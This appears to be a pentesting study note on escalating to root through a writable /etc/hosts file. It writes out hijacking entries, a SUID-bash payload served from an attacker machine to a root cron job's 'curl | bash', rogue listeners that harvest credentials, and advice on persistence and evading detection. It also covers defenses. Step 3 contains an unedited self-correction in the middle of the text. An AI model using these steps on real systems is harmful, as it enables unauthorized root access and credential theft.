---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.18 Writeable etc hosts"
---

# 44.18 Writable /etc/hosts Abuse

## 1. Introduction

The `/etc/hosts` file is a critical component of the Linux operating system's domain name resolution process. Before a system queries a DNS server to resolve a hostname (like `google.com` or `internal-db.local`) to an IP address, it consults the local `/etc/hosts` file. 

If an administrator misconfigures the permissions of the `/etc/hosts` file, allowing unprivileged users to modify it, an attacker can hijack the DNS resolution for the local machine. By redirecting network traffic destined for legitimate services to attacker-controlled listeners, the attacker can intercept credentials, serve malicious payloads, or execute man-in-the-middle (MitM) attacks, ultimately leading to local privilege escalation or lateral movement.

## 2. Core Concepts and Underlying Mechanisms

DNS resolution in Linux is controlled by the Name Service Switch (NSS) configuration file, `/etc/nsswitch.conf`. By default, the `hosts` entry is configured as `files dns`, meaning the system checks local files (`/etc/hosts`) before querying external DNS.

### 2.1 The Vulnerability: Misconfigured Permissions
By default, `/etc/hosts` has permissions `644` (`-rw-r--r--`), owned by `root:root`. If permissions are mistakenly set to `666` (`-rw-rw-rw-`) or an attacker's user belongs to a group with write access, the attacker can append or modify entries.

### 2.2 Exploitation Mechanics
When an attacker modifies the file, they map a critical hostname to the IP address of a machine they control (often `127.0.0.1` pointing back to a port the attacker is listening on, or an external IP). 
If a privileged process (like a cron job running as root, an administrator running a script, or a backend service) attempts to connect to that hostname, the traffic is routed to the attacker.

## 3. Technical Breakdown and Architecture

The following ASCII diagram illustrates the attack flow when a root cron job downloads a script from an internal update server.

```text
+-------------------------------------------------------------------------+
|                    WRITABLE /ETC/HOSTS ATTACK FLOW                      |
|                                                                         |
|  [ Original Flow - Secure ]                                             |
|  Root Cron Job: `curl -s http://update.corp.local/patch.sh | bash`      |
|         |                                                               |
|         v (Checks /etc/hosts -> DNS)                                    |
|  Resolves update.corp.local -> 10.0.0.55 (Legit Server)                 |
|         |                                                               |
|         v                                                               |
|  Executes legitimate patch.sh                                           |
|                                                                         |
|-------------------------------------------------------------------------|
|                                                                         |
|  [ Attacked Flow - Hijacked ]                                           |
|  Attacker modifies /etc/hosts:                                          |
|  $ echo "127.0.0.1 update.corp.local" >> /etc/hosts                     |
|                                                                         |
|  Root Cron Job: `curl -s http://update.corp.local/patch.sh | bash`      |
|         |                                                               |
|         v (Checks /etc/hosts)                                           |
|  Resolves update.corp.local -> 127.0.0.1 (Attacker Listener)            |
|         |                                                               |
|         +---------------------------+                                   |
|                                     |                                   |
|  [ Attacker Local Python HTTP Server ]                                  |
|  Listens on 127.0.0.1:80                                                |
|  Serves malicious patch.sh:                                             |
|  `#!/bin/bash \n cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`  |
|                                     |                                   |
|         +---------------------------+                                   |
|         v                                                               |
|  Root executes malicious script -> System Compromised                   |
|                                                                         |
+-------------------------------------------------------------------------+
```

## 4. Enumeration Strategy

Identifying a writable `/etc/hosts` file is straightforward. 

### 4.1 Manual Verification
Use `ls -la` to check the permissions of the file.
```bash
ls -la /etc/hosts
```
Output indicating vulnerability:
`-rw-rw-rw- 1 root root 221 Oct 10 10:00 /etc/hosts`

### 4.2 Automated Tools
LinPEAS and LinEnum will flag a globally writable `/etc/hosts` file in bright red/yellow as a high-severity finding.

### 4.3 Identifying the Target
Having write access is only half the battle; you must determine *which* hostname to spoof. You need to find a privileged process or script that makes network requests.
- **Cron Jobs**: Inspect `/etc/crontab`, `/etc/cron.*`, and user crontabs for commands using `wget`, `curl`, `ftp`, or `ssh`.
```bash
cat /etc/crontab | grep -E "wget|curl|ftp|scp"
```
- **Running Processes**: Monitor process execution using tools like `pspy`. Look for scripts running as root that communicate externally.
- **Application Configs**: Check database configs or web server configs for internal domains being contacted.

## 5. Exploitation Methodology

The exact exploitation steps depend entirely on how the hijacked hostname is used by the system.

### 5.1 Scenario A: Script Execution via HTTP (curl/wget | bash)
If a root cron job executes `curl http://scripts.internal/update.sh | bash`.
1. Modify `/etc/hosts` to point the domain to localhost:
```bash
echo "127.0.0.1 scripts.internal" >> /etc/hosts
```
2. Create a malicious payload in a directory you control (e.g., `/tmp`):
```bash
mkdir /tmp/web
cat << EOF > /tmp/web/update.sh
#!/bin/bash
cp /bin/bash /tmp/suidbash
chmod 4755 /tmp/suidbash
EOF
```
3. Start a web server on port 80 (note: starting a server on port 80 requires root, but if you don't have root, this exploit only works if the target script requests a high port, or if you can use port forwarding/iptables. Wait, if you don't have root, you cannot bind port 80! This is a critical edge case. If the curl command explicitly hits port 8080, you can bind it. If it hits port 80, you must hijack the DNS to point to an *external* IP you control, not `127.0.0.1`.)
Correction: Point `/etc/hosts` to your attacker machine's IP (e.g., `10.10.14.5`).
```bash
echo "10.10.14.5 scripts.internal" >> /etc/hosts
```
4. Host the file on your attacker machine:
```bash
python3 -m http.server 80
```
5. Wait for the cron job to execute. Your web server will receive the request, serve the malicious shell script, and root will execute it. Run `/tmp/suidbash -p`.

### 5.2 Scenario B: Credential Harvesting via SSH/Database
If an admin occasionally runs a backup script that connects to an internal database `db.backup.local` or SSHes into `backup-server`.
1. Point `db.backup.local` to your IP.
2. Set up a listener (e.g., netcat or a rogue MySQL server / SSH honeypot) on your machine.
3. When the script runs, it will attempt to authenticate to your rogue server, potentially sending plaintext passwords or hashes.

## 6. Edge Cases and Bypasses

- **Port Binding Restrictions**: As noted above, unprivileged users cannot bind to ports below 1024. Therefore, redirecting traffic to `127.0.0.1` only works if the target service connects to a high port (e.g., 8080, 8443). For lower ports (80, 443, 22), you must redirect the traffic to an external machine you control where you have root privileges to bind those ports.
- **Certificate Validation**: If the target process uses HTTPS (`curl https://...`), intercepting it will cause a TLS certificate validation error, and the request will fail. Bypassing this requires the script to use the `-k` or `--insecure` flag, or you must find a way to add your own Root CA to the system's trusted certificate store (which usually requires root, creating a catch-22).
- **DNS Caching**: Linux typically does not cache DNS resolution by default (unless `systemd-resolved` or `nscd` is running). If caching is active, changes to `/etc/hosts` might not take effect immediately until the cache expires or is flushed.

## 7. Post-Exploitation & Persistence

After achieving root:
- Remove the malicious entry from `/etc/hosts` immediately to restore normal functionality and avoid detection. Prolonged DNS hijacking will likely break system services and alert administrators.
- Establish robust persistence (SSH keys, SUID binaries).
- Re-secure the file permissions (`chmod 644 /etc/hosts`) to lock out other attackers.

## 8. Defense & Remediation

Securing `/etc/hosts` is fundamental and straightforward.
- **File Permissions**: The file must strictly be owned by `root:root` with `644` permissions.
```bash
chown root:root /etc/hosts
chmod 644 /etc/hosts
```
- **Auditing**: Use configuration management tools (Ansible, Chef) to enforce file permissions continuously.
- **Monitoring**: Implement File Integrity Monitoring (FIM) like AIDE or OSSEC to alert administrators the moment `/etc/hosts` is modified.
- **Secure Scripting**: Avoid piping remote scripts directly into bash (`curl | bash`). If necessary, use HTTPS, enforce TLS certificate validation, and verify the checksum of downloaded scripts before execution.

## 9. Chaining Opportunities

Writable `/etc/hosts` is a classic chaining primitive:
- **Cron Job Abuse**: As detailed, modifying DNS resolution to hijack automated tasks.
- **Package Manager Hijacking**: If `apt` or `yum` is run automatically or via an allowed `sudo` rule, hijacking the update repository domain can force the package manager to download and install malicious, backdoored `.deb` or `.rpm` packages.
- **Phishing Local Users**: Modifying the hosts file to redirect intra-company portals (e.g., `intranet.corp`) to an attacker-controlled login page to steal credentials from other users on a multi-user system.

## 10. Related Notes
- [[12 - Cron Jobs Privilege Escalation]]
- [[15 - Weak File Permissions on Sensitive Files]]
- [[40 - Network Traffic Sniffing and Spoofing]]
- [[02 - Sudo Misconfigurations]]
